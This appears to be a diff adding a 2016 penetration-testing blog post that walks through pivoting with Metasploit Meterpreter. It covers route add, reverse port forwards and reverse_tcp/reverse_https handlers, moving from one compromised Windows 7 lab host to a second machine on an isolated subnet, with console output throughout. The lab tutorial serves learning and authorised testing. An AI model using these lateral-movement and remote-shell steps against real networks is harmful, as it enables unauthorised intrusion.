@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pivoting with Metasploit Meterpreter and reverse port forwards // multiplex3r.github.io</title>
+
+    <meta charset="utf-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    
+    
+    
+
+        <meta property="og:title" content="Pivoting with Metasploit Meterpreter and reverse port forwards" />
+    <meta property="og:description" content="" />
+    <meta property="og:type" content="website" />
+    <meta property="og:locale" content="en" />
+    <meta property="og:url" content="https://multiplex3r.github.io/posts/2016-10-14-pivoting-with-meterpreter-and-reverse-port-forwards/" />
+    
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link href="https://multiplex3r.github.io/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+    <link href="https://multiplex3r.github.io/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://multiplex3r.github.io/css/style.css">
+    
+
+    <meta name="generator" content="Hugo 0.71.1" />
+</head>
+
+
+<body>
+<div id="container">
+    <header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="https://multiplex3r.github.io/">multiplex3r.github.io</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/about/">About me</a>
+                
+                <a class="main-nav-link" href="/tags/">Tags</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Pivoting with Metasploit Meterpreter and reverse port forwards</h1>
+        </header>
+        
+        <div class="article-meta">
+            <a href="/posts/2016-10-14-pivoting-with-meterpreter-and-reverse-port-forwards/" class="article-date">
+                <time datetime='2016-10-14T11:12:22.000&#43;11:00' itemprop="datePublished">2016-10-14</time>
+            </a>
+            
+            
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            <p>This post is not a CTF series post, but something I&rsquo;ve needed time and again on various network penetration tests, so I thought I would write this up as a summary for future reference, and a guide for others.</p>
+<p>In the past I&rsquo;ve pivoted using Meterpreter, autoroute, and a port forward combined with a bind payload on my &gt;=2nd hop target. However, reverse port forwards have been added to MSF so I thought I would give them a crack :)</p>
+<!-- raw HTML omitted -->
+<p>So for the purposes of this post, my lab consists of my attack box (mbp) and 2 victim machines (chuck and larry) both running Windows 7. Chuck has 2 interfaces, one connnected to the same 172.16.140.0/24 network as my mbp, this could be internet or a random subnet etc but for purposes of demonstration lets call this network &lsquo;Intranet&rsquo;. The other interface is connected to a network that larry is on but my attacking machine cannot connect to, lets call this network &lsquo;Secure&rsquo;.</p>
+<p>Here&rsquo;s a crude diagram:</p>
+<p><code>(mbp)----&lt;intranet&gt;----(chuck)----&lt;secure&gt;----(larry)</code></p>
+<p>First, we pop chuck. Use any available exploit with a Meterpreter payload.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[*] Meterpreter session 1 opened (172.16.140.1:8443 -&gt; 172.16.140.164:49171) at 2016-10-17 12:04:57 +1100
+</code></pre></div><p>After compromising chuck and getting a reverse HTTPS Meterpreter session, confirm that we can connect to larry from chuck.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Users\chuck&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : secure
+   Link-local IPv6 Address . . . . . : fe80::83d:b0f5:e9af:419%16
+   IPv4 Address. . . . . . . . . . . : 172.16.197.132
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : intranet
+   Link-local IPv6 Address . . . . . : fe80::926:d681:ec7b:6601%11
+   IPv4 Address. . . . . . . . . . . : 172.16.140.164
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.140.2
+
+C:\Users\chuck&gt;ping -n 1 172.16.197.133
+ping -n 1 172.16.197.133
+
+Pinging 172.16.197.133 with 32 bytes of data:
+Reply from 172.16.197.133: bytes=32 time=3ms TTL=128
+
+Ping statistics for 172.16.197.133:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 3ms, Maximum = 3ms, Average = 3ms
+</code></pre></div><p>Then we route traffic from mbp to the secure network through the Meterpreter session on chuck using the <code>route</code> command. Using this command, Metasploit traffic from our attacking machine destined to this subnet will now be sent via chuck. We can confirm this by doing a TCP scan of larry from the attacking machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">172.16.140.1 2016-10-17 12:05:12 +1100 lab S:1 J:2 exploit(psexec) &gt; route add 172.16.197.0/24 1
+[*] Route added
+172.16.140.1 2016-10-17 12:05:58 +1100 lab S:1 J:2 exploit(psexec) &gt; route print
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.16.197.0       255.255.255.0      Session 1
+
+172.16.140.1 2016-10-17 12:24:29 +1100 lab S:1 J:2 exploit(psexec) &gt; use auxiliary/scanner/portscan/tc
+172.16.140.1 2016-10-17 12:24:55 +1100 lab S:1 J:2 auxiliary(tcp) &gt; set RHOSTS 172.16.197.133
+RHOSTS =&gt; 172.16.197.133
+172.16.140.1 2016-10-17 12:25:01 +1100 lab S:1 J:2 auxiliary(tcp) &gt; set PORTS 445
+PORTS =&gt; 445
+172.16.140.1 2016-10-17 12:25:05 +1100 lab S:1 J:2 auxiliary(tcp) &gt; run
+
+[*] 172.16.197.133:       - 172.16.197.133:445 - TCP OPEN
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre></div><p>Ok, so now we need to setup a reverse port forward on chuck so that our new reverse TCP meterpreter session will tunnel back through the existing HTTPS meterpreter and land on our attacking machine, mbp.</p>
+<p>Lets go ahead and do that. For some reason* I was not able to get this working with HTTPS, I did find an open issue regarding this <a href="https://github.com/rapid7/metasploit-framework/issues/6799">here</a>, it could be interesting to follow this up at a later date.</p>
+<p>*The magic internals of stagers is a dark art to me, I tried the same settings as the linked thread and got the same results. So, will wait for the super smart peoples at Rapid 7 and the <a href="https://github.com/rapid7/metasploit-framework">metasploit repository</a> to check it out.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">172.16.140.1 2016-10-17 12:25:12 +1100 lab S:1 J:2 auxiliary(tcp) &gt; jobs -v
+
+Jobs
+====
+
+  Id  Name                    Payload                                Payload opts          URIPATH  Start Time                 Handler opts
+  --  ----                    -------                                ------------          -------  ----------                 ------------
+  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_https  https://0.0.0.0:8443           2016-10-17 11:58:10 +1100  https://0.0.0.0:8443
+  1   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp    tcp://0.0.0.0:4444             2016-10-17 11:58:10 +1100
+</code></pre></div><p>Now we setup the exploit and fire it at larry. The key here is that our LHOST is set for chucks secure IP address, where our listening reverse port forward is <code>set LHOST 172.16.197.132</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[*] Meterpreter session 2 opened (172.16.140.1:4444 -&gt; 172.16.140.1:56756) at 2016-10-17 12:32:21 +1100
+
+172.16.140.1 2016-10-17 12:32:22 +1100 lab S:2 J:2 exploit(psexec) &gt; sess 2
+[*] Starting interaction with 2...
+
+meterpreter &gt; sysinfo
+Computer        : LARRY
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_AU
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/win64
+</code></pre></div><p>Fantastic. We now have a shell on larry via chuck using a reverse port forward!</p>
+        </div>
+
+        
+        
+        <div class="article-toc" >
+            <h3>Contents</h3>
+            <nav id="TableOfContents"></nav>
+        </div>
+        
+        
+
+        
+
+
+        
+        <footer class="article-footer">
+            <ul class="article-tag-list">
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/penetration-testing">Penetration Testing
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/metasploit">Metasploit
+                    </a>
+                </li>
+                
+            </ul>
+        </footer>
+        
+    </div>
+    
+<nav id="article-nav">
+    
+    <a href="/posts/dont-run-metasploit-as-root/" id="article-nav-newer" class="article-nav-link-wrap">
+        <div class="article-nav-title"><span>&lt;</span>&nbsp;
+            Dont run Metasploit as root..
+        </div>
+    </a>
+    
+    
+    <a href="/posts/2016-07-31-smash-the-stack-level01/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">Smash the Stack - IO Level 1&nbsp;<span>&gt;</span></div>
+    </a>
+    
+</nav>
+
+
+</article>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2020 multiplex3r.github.io
+            <br />
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with theme <a href="https://github.com/carsonip/hugo-theme-minos" target="_blank">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+
+</div>
+</body>
+</html>
